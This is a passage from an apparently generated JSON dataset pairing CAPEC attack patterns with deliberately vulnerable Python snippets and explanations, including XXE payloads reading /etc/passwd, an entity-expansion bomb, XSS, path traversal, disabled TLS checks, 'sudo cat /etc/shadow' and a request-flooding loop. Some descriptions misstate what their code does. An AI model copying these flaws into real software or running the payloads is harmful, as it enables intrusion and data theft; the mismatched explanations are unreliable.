        "description": "This Python code snippet demonstrates a vulnerable client-side calculation of the total cost of a purchase. The server provides a price per item, and the client is responsible for calculating the total cost based on the quantity entered by the user. However, an attacker can manipulate the total cost before sending it to the server, resulting in incorrect billing. This embodies the CAPEC idea of removing or mutating 'cash' decrements, where the client-side logic is altered to send incorrect monetary information to the server. The related CWEs highlight the issues of relying on client-side enforcement, incorrect calculations, and improper validation of input quantities."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "from flask import Flask, request, send_file, Response\nimport os\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = file.filename\n    file.save(os.path.join('/tmp', filename))\n    return 'File uploaded successfully'\n\n@app.route('/serve/<filename>')\ndef serve_file(filename):\n    file_path = os.path.join('/tmp', filename)\n    if not os.path.exists(file_path):\n        return 'File not found', 404\n    mime_type = request.args.get('mime', 'text/plain')\n    with open(file_path, 'rb') as f:\n        content = f.read()\n    return Response(content, mimetype=mime_type)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that allows file uploads and serves files with a specified MIME type. The '/upload' endpoint allows users to upload files, which are saved to a temporary directory. The '/serve/<filename>' endpoint serves the uploaded files, with the MIME type specified by a query parameter. This setup can be exploited by an attacker to upload a file with scripting content (e.g., a .html file with embedded JavaScript) and then serve it with a MIME type that does not match the content (e.g., 'text/plain'). Some browsers may detect the mismatch and execute the script, leading to potential XSS attacks. This code demonstrates vulnerabilities related to CWE-79 (Cross-site Scripting), CWE-20 (Improper Input Validation), and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File)."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable to XSS due to improper neutralization of input\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a simple Flask web application with a search endpoint that is vulnerable to Cross-Site Scripting (XSS). The 'search' function retrieves a query parameter from the URL and directly embeds it into the HTML response without proper neutralization. This vulnerability aligns with CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page). The code demonstrates how user-controllable input can be exploited to inject malicious scripts, which is a common issue when web applications do not properly sanitize or escape user input."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import os\n\ndef read_sensitive_file(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError(f\"The file {file_path} does not exist.\")\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Example usage\ntry:\n    sensitive_data = read_sensitive_file('/etc/passwd')\n    print(sensitive_data)\nexcept FileNotFoundError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a functionality misuse vulnerability. The function `read_sensitive_file` reads the content of a file given its path. The example usage shows how an adversary could misuse this function to read sensitive system files like '/etc/passwd', which contains user account information on Unix-like systems. This misuse leverages the legitimate capability of reading files but in a way that was not intended, exposing sensitive system information (CWE-497). The code does not include any access control checks to prevent unauthorized access, embodying the main idea of the CAPEC description."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "import os\n\ndef read_file(filename):\n    base_directory = '/var/www/data/'\n    full_path = os.path.join(base_directory, filename)\n    \n    if not full_path.startswith(base_directory):\n        raise ValueError('Invalid file path')\n    \n    with open(full_path, 'r') as file:\n        return file.read()\n\n# Example usage\nuser_input = '../../etc/passwd'\ntry:\n    content = read_file(user_input)\n    print(content)\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of file reading that is susceptible to path traversal attacks. The function `read_file` takes a filename as input and constructs a full path by joining a base directory with the provided filename. The code attempts to check if the constructed path starts with the base directory to prevent directory traversal. However, this check is insufficient because it does not properly neutralize sequences like '/../', '....', '...', '/dir/../filename', or '.../...//', which can resolve to locations outside the restricted directory. An attacker can exploit this vulnerability by providing input such as '../../etc/passwd' to read sensitive files outside the intended directory."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "import socket\n\n# CWE-246: Direct Use of Sockets\n# This code directly uses sockets to create a simple server, which is a bad practice in J2EE applications.\n# CWE-7: Missing Custom Error Page\n# The default error handling exposes sensitive information.\n\ndef start_server():\n    try:\n        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_socket.bind(('localhost', 8080))\n        server_socket.listen(5)\n        print('Server started on port 8080')\n        while True:\n            client_socket, addr = server_socket.accept()\n            print(f'Connection from {addr}')\n            client_socket.send(b'Hello, World!')\n            client_socket.close()\n    except Exception as e:\n        # Exposing stack trace and sensitive information\n        print(f'Error occurred: {e}')\n\nif __name__ == '__main__':\n    start_server()",
        "description": "This Python code snippet demonstrates a simple server using direct socket programming, which is considered a bad practice in J2EE applications (CWE-246). Additionally, it lacks a custom error handling mechanism, exposing sensitive information through default error messages (CWE-7). The code starts a server on port 8080 and handles incoming connections, but any exceptions will print the stack trace, revealing potentially sensitive information. This embodies the main idea of the deprecated CAPEC, which involves using fuzzing to expose application details through improper error handling and configuration."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "import logging\n\n# Configure logging to write to a file\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Function that processes user input\ndef process_input(user_input):\n    try:\n        # Simulate processing of user input\n        if not isinstance(user_input, str):\n            raise ValueError('Invalid input type')\n        # Simulate a potential error that could expose sensitive information\n        if user_input == 'trigger_error':\n            raise RuntimeError('Simulated runtime error')\n        return 'Processed successfully'\n    except Exception as e:\n        # Log the error with potentially sensitive information\n        logging.error(f'Error processing input: {e}')\n        return 'An error occurred'\n\n# Example usage\nuser_inputs = ['valid_input', 123, 'trigger_error']\nfor input in user_inputs:\n    print(process_input(input))",
        "description": "This Python code snippet demonstrates a simple application that processes user input and logs errors. The `process_input` function simulates processing user input and raises exceptions for invalid input types or specific error-triggering inputs. When an error occurs, it logs the error message, which may contain sensitive information, to a log file (`app.log`). This embodies the main idea of CAPEC-202 by showing how an attacker could use fuzzing to trigger errors and examine log files for sensitive information. The related CWEs are represented by the logging of sensitive error messages (CWE-209, CWE-532, CWE-210) and the potential exposure of sensitive system information (CWE-497)."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 12345))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    data = client_socket.recv(1024)\n    if not data:\n        break\n    # No authentication or integrity check\n    print(f'Received: {data.decode()}')\n    client_socket.sendall(b'ACK')\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that listens for incoming connections on a specified port. The server accepts connections and receives data from clients but does not perform any authentication, integrity checks, or verification of the source of the communication. This makes it susceptible to various attacks, such as information exposure, message tampering, and unauthorized access. The code embodies the main idea of CAPEC-272 (Communication Channel Manipulation) and demonstrates related CWEs, including missing authentication (CWE-306), improper enforcement of message integrity (CWE-924), and improper verification of the source (CWE-940)."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "import ssl\nimport socket\n\n# Create an SSL context with incorrect configuration\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)\ncontext.verify_mode = ssl.CERT_NONE  # No certificate verification\n\n# Create a socket and wrap it with the SSL context\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nssl_sock = context.wrap_socket(sock, server_hostname='example.com')\n\n# Connect to the server\nssl_sock.connect(('example.com', 443))\n\n# Send sensitive data over the incorrectly configured SSL/TLS connection\nsensitive_data = 'username=admin&password=secret'\nssl_sock.sendall(sensitive_data.encode('utf-8'))\n\n# Close the connection\nssl_sock.close()",
        "description": "This Python code snippet demonstrates an SSL/TLS connection with incorrect configuration, embodying the main idea of the CAPEC 'Exploiting Incorrectly Configured SSL/TLS'. The SSL context is created with `ssl.PROTOCOL_TLSv1`, which is outdated and insecure. Additionally, `context.verify_mode` is set to `ssl.CERT_NONE`, meaning no certificate verification is performed, making the connection vulnerable to man-in-the-middle attacks. The code then sends sensitive data over this insecure connection, which could be intercepted by an adversary. This snippet also touches on related CWEs: CWE-201 (insertion of sensitive information into sent data), CWE-923 (improper restriction of communication channel to intended endpoints), and CWE-940 (improper verification of the source of a communication channel)."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "import requests\nfrom lxml import etree\n\n# CWE-112: Missing XML Validation\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n\n# Simulated UDDI/ebXML message\nmessage = '''\n<businessEntity>\n    <name>LegitimateBusiness</name>\n    <description>Legitimate business description</description>\n</businessEntity>\n'''\n\n# Sending the message to a potentially spoofed endpoint\nurl = \"http://malicious-actor.com/uddi\"\nresponse = requests.post(url, data=message)\n\n# No validation of the XML schema (CWE-112)\ntry:\n    root = etree.fromstring(response.content)\nexcept etree.XMLSyntaxError:\n    print(\"Received invalid XML response\")\n\n# No verification of the authenticity of the response (CWE-345)\nif root.find('name').text != 'LegitimateBusiness':\n    print(\"Warning: The response does not match the expected business entity\")\n\n# No integrity check of the message during transmission (CWE-924)\n# No proper destination verification (CWE-941)\n# No endpoint verification (CWE-300)\n\nprint(\"Response received:\", response.content)",
        "description": "This Python code snippet demonstrates a scenario where an attacker could spoof a UDDI/ebXML message to impersonate a legitimate business. The code sends a simulated UDDI/ebXML message to a potentially malicious endpoint without validating the XML schema (CWE-112). It does not verify the authenticity of the response (CWE-345), nor does it ensure the integrity of the message during transmission (CWE-924). Additionally, the code does not correctly specify the intended destination (CWE-941) and does not verify the identity of the endpoints (CWE-300). This lack of proper validation and verification can lead to security vulnerabilities such as disclosure of sensitive information, loss of message integrity, or financial fraud."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import requests\nfrom lxml import etree\n\n# Example XML data\nxml_data = '''\n<root>\n    <data>Some data</data>\n    <reference>http://malicious.com/malicious.xml</reference>\n</root>\n'''\n\n# Parse the XML data\nroot = etree.fromstring(xml_data)\n\n# Extract the reference URL\nreference_url = root.find('reference').text\n\n# Fetch the external resource (CWE-610)\nresponse = requests.get(reference_url)\n\n# Parse the external XML without validation (CWE-112)\nexternal_root = etree.fromstring(response.content)\n\n# Process the external XML (potentially CWE-611)\nexternal_data = external_root.find('data').text\n\n# Construct an XPath expression using external input (CWE-643)\nxpath_expression = f\"//data[text()='{external_data}']\"\nresult = root.xpath(xpath_expression)\n\n# Print the result\nprint(result)\n",
        "description": "This Python code snippet demonstrates a scenario where an XML Routing Detour Attack (CAPEC-94) could occur. The code processes an XML document that contains a reference to an external resource. It fetches this external resource without proper validation (CWE-112) and processes it. The external resource could be controlled by an attacker (CWE-610), leading to improper handling of XML entities (CWE-611). Additionally, the code constructs an XPath expression using external input without proper neutralization (CWE-643), which could lead to XPath Injection. This example highlights how an attacker could manipulate intermediate XML processing to reroute or modify the content, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "import socket\nimport ssl\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Wrap the socket with SSL, but allow for weak ciphers\ncontext = ssl.create_default_context()\ncontext.set_ciphers('ALL:!DH:!aNULL')  # Allow weak ciphers\n\n# Connect to the server\nwrapped_socket = context.wrap_socket(sock, server_hostname='example.com')\nwrapped_socket.connect(('example.com', 443))\n\n# Send a request\nrequest = 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'\nwrapped_socket.send(request.encode())\n\n# Receive the response\nresponse = wrapped_socket.recv(4096)\nprint(response.decode())\n\n# Close the connection\nwrapped_socket.close()",
        "description": "This Python code snippet demonstrates a client-server communication where the client uses SSL/TLS for secure communication but allows for weak ciphers, embodying the 'Selection of Less-Secure Algorithm During Negotiation' (CWE-757). The code creates a socket, wraps it with SSL using a context that permits weak ciphers, and connects to a server. This setup can be exploited by an adversary to downgrade the security of the communication. The code also directly uses sockets, which is considered a bad practice in J2EE applications (CWE-246). The main idea represented here is the manipulation of the client-server protocol to use less secure algorithms, making the communication vulnerable to attacks."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY ext SYSTEM \"file:///dev/random\">\n]>\n<root>&ext;</root>\n'''\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        print(root.text)\n    except ET.ParseError as e:\n        print(f\"Parse error: {e}\")\n\nparse_xml(xml_data)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Data Serialization External Entities Blowup' (CAPEC). The code uses the `xml.etree.ElementTree` module to parse an XML document that includes an external entity reference. The XML data contains a DOCTYPE declaration with an external entity `ext` that points to `file:///dev/random`, a special file in Unix-like systems that provides random data. When the XML parser processes this entity, it attempts to read from `/dev/random`, which can consume a large amount of resources and potentially lead to a denial of service (DoS) condition.\n\nThe code embodies CWE-611 (Improper Restriction of XML External Entity Reference) by allowing the XML parser to process external entities without restriction. This can lead to resource exhaustion or other unintended behaviors. The code also touches on CWE-99 (Improper Control of Resource Identifiers) by not restricting the input URI, allowing it to reference an external resource that can cause harm. The example highlights the importance of properly configuring XML parsers to disable external entity processing to prevent such attacks."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''<html>\n<head><title>Vulnerable Page</title></head>\n<body>\n    <iframe src=\"http://malicious-site.com\" width=\"0\" height=\"0\" style=\"opacity:0;position:absolute;top:0;left:0;\"></iframe>\n    <h1>Welcome to the Safe Site</h1>\n    <form action=\"/submit\" method=\"post\">\n        <input type=\"text\" name=\"user_input\" />\n        <input type=\"submit\" value=\"Submit\" />\n    </form>\n</body>\n</html>'''\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    return render_template_string(f'<h1>You submitted: {user_input}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates an iFrame overlay attack. The main page includes an invisible iFrame that loads content from a malicious site, which can trick the user into interacting with it unknowingly. The form on the page accepts user input and displays it back to the user without proper sanitization, making it vulnerable to cross-site scripting (XSS) attacks. This example embodies the CAPEC 'iFrame Overlay' attack and incorporates related CWEs such as improper restriction of rendered UI layers or frames (CWE-1021), improper neutralization of input during web page generation (CWE-79), and user interface misrepresentation of critical information (CWE-451)."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "import platform\nimport socket\n\n# Function to gather system information\ndef gather_system_info():\n    info = {}\n    info['os'] = platform.system()\n    info['os_version'] = platform.version()\n    info['hostname'] = socket.gethostname()\n    info['ip_address'] = socket.gethostbyname(info['hostname'])\n    return info\n\n# Function to print system information\n# This could expose sensitive information to unauthorized actors\n# CWE-200, CWE-497\nsystem_info = gather_system_info()\nprint(f\"Operating System: {system_info['os']}\")\nprint(f\"OS Version: {system_info['os_version']}\")\nprint(f\"Hostname: {system_info['hostname']}\")\nprint(f\"IP Address: {system_info['ip_address']}\")",
        "description": "This Python code snippet demonstrates the concept of fingerprinting by gathering and printing system information such as the operating system, OS version, hostname, and IP address. The `gather_system_info` function collects this data using the `platform` and `socket` modules. Printing this information can expose sensitive system details to unauthorized actors, aligning with CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). This exposure can enable an adversary to identify the system and potentially discover existing weaknesses."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n# Simulated user database\nusers = {'user1': 'password1'}\nsessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username in users and users[username] == password:\n        session_id = hashlib.sha256(f'{username}{password}'.encode()).hexdigest()\n        sessions[session_id] = username\n        resp = make_response('Logged in')\n        resp.set_cookie('session_id', session_id)\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    session_id = request.cookies.get('session_id')\n    if session_id in sessions:\n        return f'Welcome {sessions[session_id]}'\n    return 'Unauthorized', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a simple web application using Flask that is vulnerable to session credential falsification through manipulation. The application has a login route that sets a session cookie based on a hash of the username and password. The dashboard route checks the session cookie to authenticate the user. However, the code does not validate the integrity of the session cookie, making it susceptible to manipulation. An attacker could sniff the session cookie and reuse or modify it to gain unauthorized access. This example embodies the main idea of CAPEC-Session Credential Falsification through Manipulation and highlights related CWEs such as reliance on cookies without validation (CWE-565) and insufficient session expiration (CWE-613)."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "import threading\nimport time\nimport requests\n\n# Function to simulate sustained client engagement\ndef engage_resource(url):\n    while True:\n        response = requests.get(url)\n        if response.status_code != 200:\n            break\n        time.sleep(0.1)  # Short delay to keep the resource engaged without crashing it\n\n# URL of the target resource\ntarget_url = 'http://example.com/resource'\n\n# Create multiple threads to engage the resource\nthreads = []\nfor _ in range(10):\n    thread = threading.Thread(target=engage_resource, args=(target_url,))\n    threads.append(thread)\n    thread.start()\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a sustained client engagement attack. The code repeatedly sends requests to a target URL using multiple threads, keeping the resource engaged and potentially denying access to legitimate users. The `engage_resource` function continuously sends GET requests to the specified URL with a short delay between requests to avoid crashing the server. This approach aligns with the CAPEC description by tying up the resource without alerting defenders through a crash or flood. The code also reflects CWE-400 (Uncontrolled Resource Consumption) and CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of requests or threads, leading to potential resource exhaustion."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>\n'''\n\ntry:\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a DTD Injection vulnerability, specifically an XML External Entity (XXE) attack. The XML data includes a Document Type Definition (DTD) that defines an external entity 'xxe' which references the system file '/etc/passwd'. When the XML parser processes this data, it attempts to include the contents of '/etc/passwd' in the XML document. This can lead to sensitive information disclosure or other malicious impacts. The code uses Python's xml.etree.ElementTree library to parse the XML data, which is vulnerable to such attacks if not properly configured to disable DTD processing. This example embodies the main idea of CAPEC 197 and related CWEs, such as CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-827 (Improper Control of Document Type Definition)."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML parser without resource limits\nxml_data = '''<root>''' + ''.join([f'<item>{i}</item>' for i in range(1000000)]) + '''</root>'''\n\ntry:\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(f'Parsed {len(root)} items.')\nexcept ET.ParseError as e:\n    print(f'Failed to parse XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerable XML parser that can be exploited by an attacker to cause a denial of service (DoS) condition. The code constructs an XML document with a large number of 'item' elements, which can exhaust CPU resources during parsing. This embodies the main idea of the CAPEC 'Serialized Data Parameter Blowup' by showing how an inefficient parser can be overwhelmed by a large dataset. The related CWE-770 (Allocation of Resources Without Limits or Throttling) is represented by the lack of limits on the number of XML elements being parsed. The code does not address CWE-611 (Improper Restriction of XML External Entity Reference) directly, but it highlights the general issue of improper resource management in XML parsing."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data with nested entities\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY x0 \"nested\">\n<!ENTITY x1 \"&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;\">\n<!ENTITY x2 \"&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;\">\n<!ENTITY x3 \"&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;\">\n<!ENTITY x4 \"&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;\">\n<!ENTITY x5 \"&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;\">\n<!ENTITY x6 \"&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;\">\n<!ENTITY x7 \"&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;\">\n<!ENTITY x8 \"&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;\">\n<!ENTITY x9 \"&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;\">\n<!ENTITY x10 \"&x9;&x9;&x9;&x9;&x9;&x9;&x9;&x9;&x9;&x9;\">\n]>\n<root>&x10;</root>\n'''\n\ntry:\n    # Parse the XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f\"Parse error: {e}\")\n",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Serialized Data with Nested Payloads' (CAPEC). The XML data contains deeply nested entities, which can cause excessive memory consumption and CPU utilization when parsed. The code uses the xml.etree.ElementTree module to parse the XML data, which is vulnerable to such attacks due to the lack of proper validation and control over recursion depth. This example highlights CWE-112 (Missing XML Validation), CWE-20 (Improper Input Validation), CWE-674 (Uncontrolled Recursion), and CWE-770 (Allocation of Resources Without Limits or Throttling)."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function to parse XML data\n\ndef parse_xml(data):\n    try:\n        # Parse the XML data without validation\n        tree = ET.ElementTree(ET.fromstring(data))\n        return tree\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\n# Example of oversized serialized data payload\noversized_payload = \"<root>\" + \"<element>\" * 1000000 + \"</element>\" * 1000000 + \"</root>\"\n\n# Call the vulnerable function\nparse_xml(oversized_payload)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Oversized Serialized Data Payloads' (CAPEC). The function `parse_xml` attempts to parse XML data without validating it against a schema (CWE-112). An oversized payload is created by repeating XML elements a million times, which can exhaust system resources (CWE-770) and potentially lead to uncontrolled recursion (CWE-674). This example highlights the risks of improper input validation (CWE-20) and reliance on machine-dependent data representation (CWE-1102)."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "import os\n\ndef check_admin_privileges():\n    try:\n        if os.geteuid() == 0:\n            print(\"Running as root\")\n        else:\n            print(\"Not running as root\")\n    except AttributeError:\n        print(\"Cannot determine privileges on this OS\")\n\n\ndef perform_sensitive_action():\n    print(\"Performing a sensitive action...\")\n\n# Simulate a function that should only be run with admin privileges\ncheck_admin_privileges()\nperform_sensitive_action()",
        "description": "This Python code snippet demonstrates a basic privilege escalation vulnerability. The `check_admin_privileges` function attempts to check if the script is running with root privileges using `os.geteuid()`. However, the `perform_sensitive_action` function is called regardless of the privilege check result, representing CWE-269 (Improper Privilege Management) and CWE-274 (Improper Handling of Insufficient Privileges). This setup can allow an adversary to perform actions that should be restricted to higher privilege levels, embodying the main idea of the CAPEC for Privilege Escalation."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-250: Execution with Unnecessary Privileges\n# Running a command with elevated privileges\ncommand = 'ls /root'\n\ntry:\n    # CWE-114: Process Control\n    # Executing a command from an untrusted source\n    result = subprocess.run(['sudo', 'sh', '-c', command], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    print(result.stdout.decode())\nexcept subprocess.CalledProcessError as e:\n    print(f'Error: {e.stderr.decode()}')\n\n# CWE-271: Privilege Dropping / Lowering Errors\n# Not dropping privileges after executing the command\nos.setuid(os.getuid())  # This line is intended to drop privileges but is placed incorrectly\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# Creating a file with incorrect permissions\nwith open('/tmp/privileged_file', 'w') as f:\n    f.write('Sensitive data')\nos.chmod('/tmp/privileged_file', 0o777)  # Setting world-writable permissions\n\n# CWE-648: Incorrect Use of Privileged APIs\n# Using a privileged API incorrectly\nos.system('sudo cat /etc/shadow')  # Reading a sensitive file with elevated privileges",
        "description": "This Python code snippet demonstrates several security weaknesses that can lead to hijacking a privileged process. The code runs a command with elevated privileges (CWE-250) and executes it from an untrusted source (CWE-114). It attempts to drop privileges but does so incorrectly (CWE-271). It also creates a file with overly permissive permissions (CWE-732) and uses a privileged API to read a sensitive file (CWE-648). These vulnerabilities can allow an attacker to gain control of a privileged process and execute arbitrary code with elevated privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "import threading\nimport time\n\n# Shared resource with non-final static member\nclass SharedResource:\n    data = None\n\n# Function that simulates a privileged operation\ndef privileged_operation():\n    if SharedResource.data is not None:\n        print(f'Privileged operation executed with data: {SharedResource.data}')\n    else:\n        print('Privileged operation executed with no data')\n\n# Function that simulates a callback to a system routine\ndef callback_function():\n    # Simulate a race condition by sleeping\n    time.sleep(1)\n    SharedResource.data = 'Sensitive Data'\n    privileged_operation()\n\n# Create threads to simulate multi-threaded environment\nthreads = []\nfor _ in range(5):\n    t = threading.Thread(target=callback_function)\n    threads.append(t)\n    t.start()\n\n# Wait for all threads to complete\nfor t in threads:\n    t.join()",
        "description": "This Python code snippet demonstrates a multi-threaded environment where a shared resource (`SharedResource.data`) is accessed and modified by multiple threads. The `callback_function` simulates a callback to a system routine that introduces a race condition by sleeping before modifying the shared resource. The `privileged_operation` function simulates a privileged operation that uses the shared resource. This setup can lead to a race condition (CWE-362) and improper synchronization (CWE-662), where the shared resource might be accessed in an inconsistent state. The code embodies the main idea of the deprecated CAPEC pattern by showing how a callback to a system routine can lead to vulnerabilities in a multi-threaded context."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "import os\nimport signal\nimport ctypes\n\n# CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\n# CWE-782: Exposed IOCTL with Insufficient Access Control\n# CWE-391: Unchecked Error Condition\n\ndef unsafe_signal_handler(signum, frame):\n    # Unsafe operation: calling non-reentrant function\n    print(\"Signal handler called\")\n    os.system('ls')  # Non-reentrant function call\n\n# Registering the unsafe signal handler\nsignal.signal(signal.SIGINT, unsafe_signal_handler)\n\n# CWE-782: Exposed IOCTL with Insufficient Access Control\n# Simulating an IOCTL call with insufficient access control\nclass Device:\n    def __init__(self):\n        self.privileged_mode = False\n\n    def ioctl(self, command):\n        if command == 'ENABLE_PRIVILEGED_MODE':\n            self.privileged_mode = True\n        elif command == 'DISABLE_PRIVILEGED_MODE':\n            self.privileged_mode = False\n        else:\n            print(\"Unknown command\")\n\n# CWE-391: Unchecked Error Condition\ntry:\n    device = Device()\n    device.ioctl('ENABLE_PRIVILEGED_MODE')\n    # Simulating an error that is not checked\n    result = ctypes.CDLL(None).some_non_existent_function()\nexcept Exception as e:\n    pass  # Ignoring the error condition\n\n# Simulating a privileged operation\nif device.privileged_mode:\n    print(\"Privileged operation executed\")\n\n# Simulating a signal interrupt\nos.kill(os.getpid(), signal.SIGINT)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the deprecated CAPEC pattern 'Catching exception throw/signal from privileged block' and its related CWEs. The code includes an unsafe signal handler (CWE-828) that performs a non-reentrant operation, which can lead to undefined behavior if interrupted. It also simulates an IOCTL call with insufficient access control (CWE-782), allowing unauthorized enabling of privileged mode. Additionally, the code contains an unchecked error condition (CWE-391), where an exception is caught but not handled properly, potentially leading to unnoticed errors. The combination of these vulnerabilities can be exploited to hijack a privileged thread of execution, aligning with the main idea of the deprecated CAPEC pattern."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
